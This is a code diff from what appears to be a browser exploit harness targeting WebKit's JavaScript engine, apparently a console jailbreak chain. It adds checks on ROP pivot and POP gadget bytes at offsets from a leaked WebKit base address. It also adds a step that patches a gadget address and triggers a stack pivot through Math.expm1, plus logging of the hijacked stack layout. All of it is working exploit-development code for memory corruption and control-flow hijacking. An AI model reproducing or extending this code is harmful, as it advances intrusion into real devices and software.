@@ -62,17 +62,18 @@ import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectFireExpm1,
-    bisectRestore, fireNativeCallBisect } from "./native_call.js";
+    bisectRestore, fireNativeCallBisect, verifyFullChainSet, describeSlabLayout, patchPrepG5 } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830y";
+const BUILD_ID = "rw-20250830z";
 
 const NATIVE_BISECT_STEPS = [
-    { id: "prep", label: "N1 prep", title: "leakval expm1 + slab S/P/K/F" },
+    { id: "prep", label: "N1 prep", title: "skip if PREP-PIN @ Start (?freshprep=1 to redo)" },
     { id: "layout-smoke", label: "N2 layout", title: "write smoke ROP stack (no JSC writes)" },
     { id: "arm-g0", label: "N3 arm G0", title: "write G0 → main m_function" },
-    { id: "hook", label: "N4 hook", title: "pivot cell → S" },
+    { id: "hook", label: "N4 hook", title: "pivot cell → S + log RSP/stack" },
     { id: "expm1", label: "N5 expm1", title: "Math.expm1 — pivot runs (OOM likely here)" },
+    { id: "expm1-g5alt", label: "N5b G5alt", title: "G5=expm1+0x53642a then expm1 (after N3+N4)" },
     { id: "restore", label: "N6 restore", title: "restore pivot + main" },
     { id: "smoke-full", label: "N7 smoke", title: "layout + full fire (smoke)" },
     { id: "layout-getpid", label: "N8 stage lk", title: "layout getpid stub (needs lk in box)" },
@@ -703,13 +704,17 @@ function gateNativeFire(p, off) {
         mark("NATIVE-SKIP", "no webkitBase — Start first");
         return false;
     }
-    const v = verifyPivotSet(addr => read1p(p, addr), wb, off);
+    const v = verifyFullChainSet(addr => read1p(p, addr), wb, off);
     if (!v.ok) {
-        mark("NATIVE-SKIP", "pivot not verified — tap Verify pivot (G0-G5 bytes)");
-        if (v.bad.length)
-            logPivotBadBytes(p, wb, off, v.bad);
-        else if (v.missing.length)
-            mark("PIVOT-MISS", v.missing.join(", "));
+        mark("NATIVE-SKIP", "chain not verified — tap Verify pivot (G0-G5 + POP bytes)");
+        if (v.pivot.bad.length)
+            logPivotBadBytes(p, wb, off, v.pivot.bad);
+        else if (v.pivot.missing.length)
+            mark("PIVOT-MISS", v.pivot.missing.join(", "));
+        if (v.popBad.length)
+            mark("POP-BAD", v.popBad.join(", ") + " @ wb=" + wb);
+        else if (v.popMissing.length)
+            mark("POP-MISS", v.popMissing.join(", "));
         return false;
     }
     return true;
@@ -717,6 +722,10 @@ function gateNativeFire(p, off) {
 
 function ensureNativePrepForFire(p, off, nm) {
     trimBeforeNativeFire();
+    if (nativePrep && params.get("freshprep") !== "1") {
+        mark("NATIVE-PREP", "reuse Start slab wb=" + nativePrep.webkitBase + " mode=" + nm);
+        return;
+    }
     nativePrep = null;
     ensureNativePrep(p, off);
     mark("NATIVE-PREP", "fresh slab wb=" + nativePrep.webkitBase + " mode=" + nm);
@@ -2307,21 +2316,28 @@ function verifyPivotManual() {
     const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
     mark("PIVOT-CHECK", "G5="
         + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — HW +0x13ec77a"));
-    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
-    if (v.missing.length)
-        mark("PIVOT-MISS", v.missing.join(", ") + " — tap a G5 button above");
-    if (v.bad.length) {
-        mark("PIVOT-BAD", v.bad.join(", ") + " — bytes mismatch at RVA");
-        logPivotBadBytes(p, webkitBase, off, v.bad);
+    const v = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
+    if (v.pivot.missing.length)
+        mark("PIVOT-MISS", v.pivot.missing.join(", ") + " — tap a G5 button above");
+    if (v.pivot.bad.length) {
+        mark("PIVOT-BAD", v.pivot.bad.join(", ") + " — bytes mismatch at RVA");
+        logPivotBadBytes(p, webkitBase, off, v.pivot.bad);
     }
-    if (v.good.length)
-        mark("PIVOT-OK", v.good.join(", "));
+    if (v.pivot.good.length)
+        mark("PIVOT-OK", v.pivot.good.join(", "));
+    if (v.popBad.length)
+        mark("POP-BAD", v.popBad.join(", ") + " — smoke chain will OOM @ expm1");
+    else if (v.popGood.length)
+        mark("POP-OK", v.popGood.join(", "));
+    if (v.popMissing.length)
+        mark("POP-MISS", v.popMissing.join(", "));
     pivotReady = v.ok;
     if (v.ok) {
-        mark("PIVOT-READY", v.count + "/" + v.total + " (optional — skip, use Fire getpid)");
-        state("pivot OK — optional", "ok");
+        mark("PIVOT-READY", v.pivot.count + "/" + v.pivot.total
+            + " pivot + " + v.popGood.length + " pop");
+        state("chain OK — bisect N2→N5 or Fire smoke", "ok");
     } else {
-        state("pivot not ready — " + pivotNotReadyMsg(v), "warn");
+        state("chain not ready — " + pivotNotReadyMsg(v.pivot), "warn");
     }
     setUi();
 }
@@ -3675,10 +3691,16 @@ function runNativeBisectStep(stepId) {
     try {
         switch (stepId) {
         case "prep":
+            if (nativePrep && params.get("freshprep") !== "1") {
+                mark("BISECT-OK", "N1 reuse @ Start wb=" + nativePrep.webkitBase
+                    + " S=" + nativePrep.M.S + " (skip N1 — prep pinned @ PRIMITIVE-OK)");
+                state("N1 skipped — use N2", "ok");
+                break;
+            }
             nativePrep = null;
             ensureNativePrep(p, off);
             pinNativeRetain();
-            mark("BISECT-OK", "N1 prep wb=" + nativePrep.webkitBase
+            mark("BISECT-OK", "N1 fresh prep wb=" + nativePrep.webkitBase
                 + " S=" + nativePrep.M.S + " K=" + nativePrep.M.K
                 + " G0=" + nativePrep.G.G0 + " G5=" + nativePrep.G.G5
                 + " mainMf=" + nativePrep.mainMf + " pivotCell=" + nativePrep.pivotCell);
@@ -3699,19 +3721,42 @@ function runNativeBisectStep(stepId) {
         case "hook":
             requireNativePrep();
             bisectHookPivot(p, nativePrep);
-            mark("BISECT-OK", "N4 pivotCell → S=" + nativePrep.M.S
-                + " saved=" + (nativePrep._bisect && nativePrep._bisect.pivotSaved));
+            try {
+                const d = describeSlabLayout(p, nativePrep);
+                mark("BISECT-OK", "N4 pivotCell → S=" + nativePrep.M.S
+                    + " saved=" + (nativePrep._bisect && nativePrep._bisect.pivotSaved)
+                    + " rsp=" + d.rsp + " K=" + d.K
+                    + " peek=" + d.pivotPeek + " G5=" + d.G5);
+                if (d.stackTop.length)
+                    mark("BISECT-STACK", d.stackTop.map((q, i) => "[" + i + "]=" + q).join(" "));
+            } catch (logErr) {
+                mark("BISECT-OK", "N4 hook (layout log: " + (logErr.message || logErr) + ")");
+            }
             state("N4 hook OK", "ok");
             break;
         case "expm1":
             requireNativePrep();
-            mark("BISECT-WARN", "N5 Math.expm1 — OOM usually here if pivot bad");
+            mark("BISECT-WARN", "N5 Math.expm1 — OOM = bad RSP/POP gadget, not lk");
             renderOut();
             bisectFireExpm1(p, nativePrep);
             pid = nativePrep.M.frameDv.getUint32(0, true) | 0;
             mark("BISECT-OK", "N5 expm1 survived frame=" + pid);
             state("N5 expm1 OK", "ok");
             break;
+        case "expm1-g5alt": {
+            requireNativePrep();
+            const g5rva = g5Expm1Hint(off);
+            if (!g5rva) throw new Error("no G5 expm1 hint");
+            const g5 = nativePrep.webkitBase.add32(g5rva);
+            patchPrepG5(nativePrep, g5);
+            mark("BISECT-WARN", "N5b G5alt expm1+0x" + g5rva.toString(16) + " → " + g5);
+            renderOut();
+            bisectFireExpm1(p, nativePrep);
+            pid = nativePrep.M.frameDv.getUint32(0, true) | 0;
+            mark("BISECT-OK", "N5b G5alt survived frame=" + pid);
+            state("N5b G5alt OK", "ok");
+            break;
+        }
         case "restore":
             requireNativePrep();
             bisectRestore(p, nativePrep);
@@ -4100,12 +4145,13 @@ async function runStart() {
         try {
             ensureNativePrep(p, off);
             mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + getNativeMode());
+            mark("PREP-PIN", "bisect N2→N5 skip N1 — prep captured before heap churn");
             tryNativeFireAtStart(p, off);
         } catch (prepErr) {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Verify pivot → 2e Leak+lk → Fire getpid (same page, no reload)");
+        mark("HINT", "Verify pivot (POP+G0-G5) → bisect N2-N5 or Fire smoke");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
